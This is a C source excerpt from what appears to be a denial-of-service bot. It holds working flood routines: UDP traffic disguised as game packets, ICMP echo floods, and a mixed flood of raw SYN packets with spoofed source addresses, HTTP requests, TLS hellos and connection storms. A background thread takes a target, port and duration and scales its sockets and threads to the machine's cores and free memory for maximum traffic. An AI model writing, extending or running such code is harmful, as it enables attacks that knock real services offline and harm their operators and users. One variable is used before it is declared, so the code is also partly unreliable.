void game_mimic(struct sockaddr_in ta, AttackParams *p, TokenBucket *tb)
{
    int socks[FLOOD_SOCKS];
    int nsk = 0;
    for (int i = 0; i < FLOOD_SOCKS; i++) {
        int s = create_udp_socket();
        if (s >= 0) socks[nsk++] = s;
    }
    if (nsk < 1) return;

    unsigned char buf[512];
    int len = 0;
    unsigned int seed = (unsigned int)time(NULL) ^ (unsigned int)(uintptr_t)pthread_self();
    while (p->duration_secs && !g_attack_stop) {
        if (!tb_consume(tb, 64)) { usleep(20); continue; }
        if (should_pause()) { usleep(200); continue; }
        for (int b = 0; b < 64 && !g_attack_stop; b++) {
            gen_game_pkt(buf, &len);
            /* Pad to larger size for bandwidth */
            int pad = 64 + (int)(rand_r(&seed) % 200);
            if (len + pad > (int)sizeof(buf)) pad = (int)sizeof(buf) - len;
            for (int j = 0; j < pad; j++) buf[len + j] = (unsigned char)rand_r(&seed);
            len += pad;
            int s = socks[rand_r(&seed) % nsk];
            if (sendto(s, buf, (size_t)len, MSG_DONTWAIT, (struct sockaddr *)&ta, sizeof(ta)) > 0)
                pkt_sent(len);
        }
    }
    for (int i = 0; i < nsk; i++) close(socks[i]);
}

void icmp_flood(struct sockaddr_in ta, AttackParams *p, TokenBucket *tb)
{
    int s = create_raw_socket(IPPROTO_ICMP);
    if (s < 0) return;
    unsigned char icmp[1200];
    unsigned int seed = (unsigned int)time(NULL) ^ (unsigned int)(uintptr_t)pthread_self();
    uint16_t seq = 0;

    while (p->duration_secs && !g_attack_stop) {
        if (!tb_consume(tb, 128)) { usleep(20); continue; }
        if (should_pause()) { usleep(200); continue; }
        for (int b = 0; b < 128 && !g_attack_stop; b++) {
            int plen = 64 + (int)(rand_r(&seed) % 1100);
            memset(icmp, 0, (size_t)plen);
            icmp[0] = 8; /* echo request */
            icmp[1] = 0;
            icmp[4] = (unsigned char)((seq >> 8) & 0xFF);
            icmp[5] = (unsigned char)(seq & 0xFF);
            seq++;
            for (int j = 8; j < plen; j++) icmp[j] = (unsigned char)rand_r(&seed);
            icmp[2] = icmp[3] = 0;
            uint16_t c = icmp_csum(icmp, (size_t)plen);
            icmp[2] = (unsigned char)(c & 0xFF);
            icmp[3] = (unsigned char)((c >> 8) & 0xFF);
            if (sendto(s, icmp, (size_t)plen, MSG_DONTWAIT, (struct sockaddr *)&ta, sizeof(ta)) > 0)
                pkt_sent(plen);
        }
    }
    close(s);
}

void mixed(struct sockaddr_in ta, AttackParams *p, TokenBucket *tb)
{
    int us = create_udp_socket();
    int rs = create_raw_socket(IPPROTO_TCP);
    if (us < 0) {
        if (rs >= 0) close(rs);
        return;
    }
    unsigned int seed = (unsigned int)time(NULL) ^ (unsigned int)(uintptr_t)pthread_self();
    unsigned char big[MAX_PAYLOAD];

    while (p->duration_secs && !g_attack_stop) {
        if (!tb_consume(tb, 64)) { usleep(20); continue; }
        if (should_pause()) { usleep(200); continue; }
        for (int b = 0; b < 64 && !g_attack_stop; b++) {
            int c = rand_r(&seed) % 8;
            if (c <= 2) {
                /* Heavy UDP — majority of mix */
                int len = 800 + (int)(rand_r(&seed) % 600);
                if (g_total_payloads > 0) {
                    int idx = rand_r(&seed) % g_total_payloads;
                    int pl = g_payload_lens[idx];
                    if (pl > MAX_PAYLOAD) pl = MAX_PAYLOAD;
                    memcpy(big, g_payloads[idx], (size_t)pl);
                    for (int j = pl; j < len; j++) big[j] = (unsigned char)rand_r(&seed);
                } else {
                    for (int j = 0; j < len; j++) big[j] = (unsigned char)rand_r(&seed);
                }
                if (sendto(us, big, (size_t)len, MSG_DONTWAIT, (struct sockaddr *)&ta, sizeof(ta)) > 0)
                    pkt_sent(len);
            } else if (c == 3 && rs >= 0) {
                struct { struct iphdr ip; struct tcphdr tcp; } pkt;
                memset(&pkt, 0, sizeof(pkt));
                pkt.ip.version = 4; pkt.ip.ihl = 5;
                pkt.ip.tot_len = htons(sizeof(pkt));
                pkt.ip.id = htons((uint16_t)rand_r(&seed));
                pkt.ip.ttl = 50 + (rand_r(&seed) % 74);
                pkt.ip.protocol = IPPROTO_TCP;
                pkt.ip.saddr = (p->spoof_mode >= 1) ? rand_vn_ip() : rand_r(&seed);
                pkt.ip.daddr = ta.sin_addr.s_addr;
                pkt.tcp.source = htons((uint16_t)(1024 + (rand_r(&seed) % 64511)));
                pkt.tcp.dest = htons((uint16_t)p->port);
                pkt.tcp.seq = htonl(rand_r(&seed));
                pkt.tcp.doff = 5; pkt.tcp.syn = 1;
                pkt.tcp.window = htons(65535);
                pkt.ip.check = 0; pkt.ip.check = ip_csum(&pkt.ip, sizeof(struct iphdr));
                pkt.tcp.check = 0; pkt.tcp.check = tcp_csum(&pkt.ip, &pkt.tcp);
                if (sendto(rs, &pkt, sizeof(pkt), MSG_DONTWAIT, (struct sockaddr *)&ta, sizeof(ta)) > 0)
                    pkt_sent((int)sizeof(pkt));
            } else if (c == 4) {
                int s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
                if (s >= 0) {
                    fcntl(s, F_SETFL, O_NONBLOCK);
                    connect(s, (struct sockaddr *)&ta, sizeof(ta));
                    unsigned char buf[2048]; int len = 0;
                    gen_http(buf, &len, p->target);
                    send(s, buf, (size_t)len, MSG_DONTWAIT | MSG_NOSIGNAL);
                    close(s); pkt_sent(len);
                }
            } else if (c == 5) {
                unsigned char buf[512]; int len = 0;
                gen_game_pkt(buf, &len);
                if (sendto(us, buf, (size_t)len, MSG_DONTWAIT, (struct sockaddr *)&ta, sizeof(ta)) > 0)
                    pkt_sent(len);
            } else if (c == 6) {
                int s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
                if (s >= 0) {
                    fcntl(s, F_SETFL, O_NONBLOCK);
                    connect(s, (struct sockaddr *)&ta, sizeof(ta));
                    unsigned char buf[1024]; int len = 0;
                    gen_tls_hello(buf, &len, p->target);
                    send(s, buf, (size_t)len, MSG_DONTWAIT | MSG_NOSIGNAL);
                    close(s); pkt_sent(len);
                }
            } else {
                int s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
                if (s >= 0) {
                    fcntl(s, F_SETFL, O_NONBLOCK);
                    connect(s, (struct sockaddr *)&ta, sizeof(ta));
                    close(s); pkt_sent(64);
                }
            }
        }
    }
    close(us);
    if (rs >= 0) close(rs);
}

/* ── Background Attack Thread ───────────────────────── */
void *bg_attack_thread(void *arg)
{
    BgAttackCtx *ctx = (BgAttackCtx *)arg;
    if (!ctx) return NULL;
    AttackParams *atk = &ctx->atk;
    if (atk->duration_secs <= 0) atk->duration_secs = 60;
    if (atk->port <= 0 || atk->port > 65535) atk->port = 80;
    if (!atk->target[0]) { free(ctx); return NULL; }

    time_t deadline = time(NULL) + atk->duration_secs;
    g_attack_active = 1;
    g_attack_stop = 0;
    g_pkt_count = 0;
    g_byte_count = 0;

    fprintf(stderr, "[atk] START method=%s target=%s:%d dur=%ds pps=%u mega=%u\n",
            atk->method, atk->target, atk->port, atk->duration_secs,
            atk->max_pps, atk->mega_mode);

    if (atk->mega_mode || !strcmp(atk->method, "MEGA")) {
        int cores = get_nprocs();
        if (cores < 1) cores = 1;

        /* Adaptive sockets: cores * 8, capped by free RAM and MEGA_MAX_SOCKS */
        struct sysinfo si;
        long free_mb = 512;
        if (sysinfo(&si) == 0)
            free_mb = (long)(si.freeram / (1024 * 1024));
        int max_sk = cores * MEGA_SOCKS_PER_CPU;
        int ram_cap = (int)(free_mb / 2); /* ~2MB per socket */ /* ~4MB kernel+user buf per sock */
        if (ram_cap < 8) ram_cap = 8;
        if (max_sk > ram_cap) max_sk = ram_cap;
        if (max_sk > MEGA_MAX_SOCKS) max_sk = MEGA_MAX_SOCKS;
        if (max_sk < 8) max_sk = 8;

        /* Thread layout: majority UDP mega, + TCP storm, + SYN if raw works */
        int n_udp = cores;
        if (n_udp < 1) n_udp = 1;
        if (n_udp > 8) n_udp = 8;
        if (n_udp > sock_cnt) n_udp = sock_cnt; /* BUG-1.1: cap to available sockets */
        int n_tcp = (cores >= 2) ? 1 : 1;
        int n_syn = 0;
        int raw_probe = create_raw_socket(IPPROTO_TCP);
        if (raw_probe >= 0) { close(raw_probe); n_syn = 1; }
        int threads = n_udp + n_tcp + n_syn;

        int *socks = calloc((size_t)max_sk, sizeof(int));
        if (!socks) { g_attack_active = 0; free(ctx); return NULL; }
        int sock_cnt = 0;
        for (int i = 0; i < max_sk; i++) {
            int s = create_udp_socket();
            if (s < 0) break;
            socks[sock_cnt++] = s;
        }
        if (sock_cnt < 1) {
            free(socks);
            g_attack_active = 0; free(ctx); return NULL;
        }

        struct sockaddr_in ta;
        memset(&ta, 0, sizeof(ta));
        ta.sin_family = AF_INET;
        ta.sin_port = htons((uint16_t)atk->port);
        if (resolve_target(atk->target, &ta.sin_addr) != 0) {
            for (int i = 0; i < sock_cnt; i++) close(socks[i]);
            free(socks);
            g_attack_active = 0; free(ctx); return NULL;
        }

        pthread_t *tids = calloc((size_t)threads, sizeof(pthread_t));
        MegaThread *mt = calloc((size_t)threads, sizeof(MegaThread));
        if (!tids || !mt) {
            free(socks); free(tids); free(mt);
            g_attack_active = 0; free(ctx); return NULL;
        }

        pthread_attr_t attr;
        pthread_attr_init(&attr);
        pthread_attr_setstacksize(&attr, 512 * 1024);

        int ti = 0;
        int spth = sock_cnt / n_udp;
        if (spth < 1) spth = 1;
        for (int i = 0; i < n_udp; i++) {
            mt[ti].socks = &socks[i * spth];
            mt[ti].sock_count = (i == n_udp - 1) ? sock_cnt - (i * spth) : spth;
            if (mt[ti].sock_count < 1) mt[ti].sock_count = 1;
            mt[ti].target = ta;
            mt[ti].port = atk->port;
            mt[ti].duration = atk->duration_secs;
            mt[ti].cpu_id = i;
            mt[ti].mode = 0; /* UDP mega */
            strncpy(mt[ti].host, atk->target, sizeof(mt[ti].host) - 1);
            pthread_create(&tids[ti], &attr, mega_worker, &mt[ti]);
            ti++;
        }
        /* TCP connection storm */
        mt[ti].socks = NULL; mt[ti].sock_count = 0;
        mt[ti].target = ta; mt[ti].port = atk->port;
        mt[ti].duration = atk->duration_secs;
        mt[ti].cpu_id = n_udp % cores;
        mt[ti].mode = 1;
        strncpy(mt[ti].host, atk->target, sizeof(mt[ti].host) - 1);
        pthread_create(&tids[ti], &attr, mega_worker, &mt[ti]);
        ti++;
        /* SYN raw if available */
        if (n_syn) {
            mt[ti].socks = NULL; mt[ti].sock_count = 0;
            mt[ti].target = ta; mt[ti].port = atk->port;
            mt[ti].duration = atk->duration_secs;
            mt[ti].cpu_id = (n_udp + 1) % cores;
            mt[ti].mode = 2;
            strncpy(mt[ti].host, atk->target, sizeof(mt[ti].host) - 1);
            pthread_create(&tids[ti], &attr, mega_worker, &mt[ti]);
            ti++;
        }
        pthread_attr_destroy(&attr);

        while (!g_attack_stop && time(NULL) < deadline) sleep(1);
        g_attack_stop = 1;
        for (int i = 0; i < threads; i++) pthread_join(tids[i], NULL);
        for (int i = 0; i < sock_cnt; i++) close(socks[i]);
        free(socks); free(tids); free(mt);
    } else {
        struct sockaddr_in ta;
        memset(&ta, 0, sizeof(ta));
        ta.sin_family = AF_INET;
        ta.sin_port = htons((uint16_t)atk->port);
        if (resolve_target(atk->target, &ta.sin_addr) != 0) {
            g_attack_active = 0; free(ctx); return NULL;
        }
        TokenBucket tb;
        /* Shared rate across workers; burst = 2x for spikes */
        double rate = (double)(atk->max_pps > 0 ? atk->max_pps : 100000);
        tb_init(&tb, rate, rate * 2.0);
        int cores = get_nprocs();
        if (cores < 1) cores = 1;
        int nc = (int)atk->max_threads;
        if (nc < 1) nc = cores * 2;
        if (nc > cores * 4) nc = cores * 4; /* cap: avoid thrash */
        if (nc > 32) nc = 32;
        if (nc < 1) nc = 1;
        /* Per-worker rate share so total ≈ max_pps */
        double per = rate / (double)nc;
        if (per < 1) per = 1;

        pthread_t *tids = malloc((size_t)nc * sizeof(pthread_t));
        if (!tids) { g_attack_active = 0; free(ctx); return NULL; }
        int launched = 0;
        for (int i = 0; i < nc; i++) {
            WorkerArg *w = malloc(sizeof(WorkerArg));
            AttackParams *ap = malloc(sizeof(AttackParams));
            TokenBucket *tbp = malloc(sizeof(TokenBucket));
            if (!w || !ap || !tbp) { free(w); free(ap); free(tbp); continue; }
            memcpy(ap, atk, sizeof(AttackParams));
            tb_init(tbp, per, per * 2.0);
            w->ap = ap; w->tb = tbp; w->ta = ta; w->cpu = i % cores;
            if (pthread_create(&tids[launched], NULL, attack_worker, w) == 0)
                launched++;
            else {
                free(ap); free(tbp); free(w);
            }
        }
        nc = launched;
        while (!g_attack_stop && time(NULL) < deadline) sleep(1);
        g_attack_stop = 1;
        for (int i = 0; i < nc; i++) pthread_join(tids[i], NULL);
        free(tids);
    }
    fprintf(stderr, "[atk] DONE pkts=%llu bytes=%llu\n", g_pkt_count, g_byte_count);
    g_attack_active = 0;
    free(ctx);
    return NULL;
}
